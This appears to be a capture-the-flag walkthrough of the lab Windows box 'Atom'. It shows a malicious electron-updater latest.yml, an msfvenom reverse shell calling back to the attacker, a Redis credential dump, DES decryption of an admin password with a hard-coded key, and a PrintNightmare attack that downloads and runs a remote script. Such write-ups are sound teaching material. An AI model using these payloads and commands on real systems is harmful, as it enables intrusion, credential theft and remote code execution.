# Atom
Atom: A Walkthrough by Mursalin
=============================

Atom is a medium Windows box that chains a misconfigured update server with an Electron app’s insecure update mechanism. By reverse‑engineering the application, I learn how it fetches updates, then I plant a malicious payload on the SMB share to gain a foothold as `jason`. For root, I exploit a PortableKanban instance that stores its data in Redis, extract the administrator’s encrypted password, decrypt it with a hard‑coded DES key, and log in via WinRM. In Beyond Root, I take a quick detour through PrintNightmare.

Recon
-----

### nmap

A full TCP scan discovers seven open ports:

```bash
mursalin@kali$ nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.112
...
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
7680/tcp open  pando-pub
```

Service detection (`-sCV`) reveals Apache 2.4.46 on Windows (likely XAMPP), Redis, SMB, and WinRM. The SMB script identifies the host as `ATOM`, running Windows 10 Pro build 19042.

### SMB – TCP 445

A null session doesn’t work, but passing any invalid user triggers a guest session that can list shares:

```bash
mursalin@kali$ smbmap -H 10.10.10.112 -u mursalin -p mursalin
[+] Guest session       IP: 10.10.10.112:445
    Disk         Permissions     Comment
    ----         -----------     -------
    ADMIN$       NO ACCESS       Remote Admin
    C$           NO ACCESS       Default share
    IPC$         READ ONLY       Remote IPC
    Software_Updates READ,WRITE
```

The `Software_Updates` share is writable and contains a PDF and three empty client folders:

```bash
mursalin@kali$ smbclient //10.10.10.112/Software_Updates -N
smb: \> ls
  UAT_Testing_Procedures.pdf
  client1
  client2
  client3
```

I grab the PDF. It’s an internal document that explains how Heed Solutions tests its note‑taking app. A QA section mentions that updates are placed into the `client` folders on the update server, and the appropriate QA team tests them. This immediately hints that planting a crafted update file here might lead to code execution when the application checks for updates.

### Website – TCP 80/443

Both ports serve a static “Heed Solutions” page. There’s a download link for `heed_setup_v1.0.0.zip`. No virtual hosts are revealed, and directory brute‑forcing with `feroxbuster` yields nothing useful.

Reverse‑Engineering the Heed Application
----------------------------------------

I download the ZIP and extract the installer (`heedv1 Setup 1.0.0.exe`). The file is a Nullsoft installer, which I can open as an archive. Inside, I find `app-64.7z`, which decompresses to reveal an Electron application structure. The key file is `resources/app.asar`.

Using the `asar` tool (`npm install -g asar`), I extract `main.js`:

```bash
mursalin@kali$ asar ef app.asar main.js
```

The script imports `electron-updater` and configures it with `autoUpdater.checkForUpdates()`. There’s also a file `app-update.yml` in the resources:

```yaml
provider: generic
url: 'http://updates.atom.htb'
```

This tells me the app fetches updates from `updates.atom.htb`. I add both `atom.htb` and `updates.atom.htb` to my `/etc/hosts`.

I could also perform the same analysis on a Windows VM: running Heed shows an “Error in auto‑updater” message, and Wireshark reveals DNS requests for `updates.atom.htb`. Once the hostname is pointed to the box, the app tries to fetch `latest.yml`.

Gaining a Shell as `jason`
--------------------------

### The Electron‑Updater Vulnerability

Researching “electron‑updater latest.yml exploit” leads to a known weakness: the update check parses `latest.yml` and can be tricked with a single quote in the filename to bypass signature verification, leading to arbitrary command execution. Additionally, a command injection via `';calc;'` style filename is possible.

I’ll craft a `latest.yml` that points to a reverse shell executable, using the quote trick to break the signature check.

### Local Payload Delivery

First, I create the payload with `msfvenom`:

```bash
mursalin@kali$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -o rev.exe
```

Next, I compute the base64‑encoded SHA512 as required by the updater:

```bash
mursalin@kali$ sha512sum rev.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0
```

Now I assemble `latest.yml`:

```yaml
version: 2.2.3
files:
  - url: r'ev.exe
    sha512: 94WZYO7lW9xUcWqtf7bcuLtrgFk50zeHWuXLF143BKErDzqK0saJz550GS4py14J8wDP6cvMeZI5zruNYf8gOg==
    size: 7168
path: r'ev.exe
sha512: 94WZYO7lW9xUcWqtf7bcuLtrgFk50zeHWuXLF143BKErDzqK0saJz550GS4py14J8wDP6cvMeZI5zruNYf8gOg==
releaseDate: '2021-04-17T11:17:02.627Z'
```

The `url` field contains the quoted filename `r'ev.exe`. I upload both `latest.yml` and `rev.exe` (renamed to `r'ev.exe`) into one of the client folders via SMB:

```bash
smb: \client1\> put latest.yml
smb: \client1\> put rev.exe r'ev.exe
```

Within a minute, a reverse shell connects back:

```bash
mursalin@kali$ rlwrap nc -lvnp 443
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.112] 50128
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
atom\jason
```

`user.txt` is on the desktop.

### Remote Payload Delivery (Alternative)

Later, I noticed that `url` could point to an HTTP server. I create a new YAML:

```yaml
version: 2.2.5
files:
  - url: http://10.10.14.7/r'ev.exe
    sha512: xYmfwTcneb8dT4kVFeUtvyrEGi1iiJvqrU1PaLPMC/omejOR7f0gyOT1lTv8pjcXXr6kR0u8rAxg4Sd5zk/fOw==
    size: 7168
path: r'ev.exe
sha512: xYmfwTcneb8dT4kVFeUtvyrEGi1iiJvqrU1PaLPMC/omejOR7f0gyOT1lTv8pjcXXr6kR0u8rAxg4Sd5zk/fOw==
releaseDate: '2021-04-17T11:17:02.627Z'
```

I upload only the YAML to the share and serve the executable from my Kali machine. The shell still arrives, confirming the file can be fetched remotely.

Privilege Escalation to Administrator
-------------------------------------

### PortableKanban and Redis

Inside `jason`’s `Downloads` folder I find `PortableKanban`, a Kanban board application. The configuration file `PortableKanban.cfg` contains this snippet:

```json
"DataSource":"RedisServer",
"DbServer":"localhost",
"DbPort":6379,
"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"
```

So PortableKanban uses Redis as its backend, and the database password is encrypted.

The Redis server on `localhost` requires authentication. I find the plaintext password in the Redis configuration file:

```powershell
PS C:\Program Files\redis> type redis.windows-service.conf | select-string -pattern "^#" -NotMatch | select-string .
requirepass kidvscat_yes_kidvscat
```

Now I can access Redis:

```bash
mursalin@kali$ redis-cli -h 10.10.10.112
10.10.10.112:6379> auth kidvscat_yes_kidvscat
OK
10.10.10.112:6379> keys *
1) "pk:ids:MetaDataClass"
2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:User"
```

The third key holds the administrator’s data:

```
get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",...,\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\"...
```

The password is encrypted with the same algorithm used for the database password. A public exploit for PortableKanban (available on Exploit‑DB) shows that the encryption is just DES with a hard‑coded key `7ly6UznJ` and IV `XuVUm5fR`.

I can decrypt the password using CyberChef or a small Python script:

```python
#!/usr/bin/env python3
import base64
from des import DesKey

def decrypt(hash):
    hash = base64.b64decode(hash.encode())
    key = DesKey(b"7ly6UznJ")
    return key.decrypt(hash, initial=b"XuVUm5fR", padding=True).decode()

print(decrypt("Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"))
```

This outputs `kidvscat_admin_@123`.

### WinRM as Administrator

The recovered password works for the Administrator account over WinRM:

```bash
mursalin@kali$ evil-winrm -i 10.10.10.112 -u administrator -p 'kidvscat_admin_@123'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
0e7896dd************************
```

And the box is owned.

Beyond Root – PrintNightmare
----------------------------

Atom is vulnerable to CVE-2021-34527 (PrintNightmare). While I already had a shell as `jason`, I could quickly demonstrate local privilege escalation.

From the reverse shell, I load the `Invoke-Nightmare` PowerShell script directly into memory (to bypass execution policy) and run it:

```powershell
PS C:\programdata> iex(new-object net.webclient).downloadstring('http://10.10.14.7/CVE-2021-1675.ps1')
PS C:\programdata> Invoke-Nightmare -NewUser "mursalin" -NewPassword "mursalin123"
[+] added user mursalin as local administrator
```

Now I can use Impacket’s `psexec.py` to get a SYSTEM shell:

```bash
mursalin@kali$ psexec.py mursalin:mursalin123@10.10.10.112 cmd.exe
C:\WINDOWS\system32> whoami
nt authority\system
```

That’s Atom – a satisfying blend of client‑side exploitation and simple cryptographic reuse.

~ Mursalin
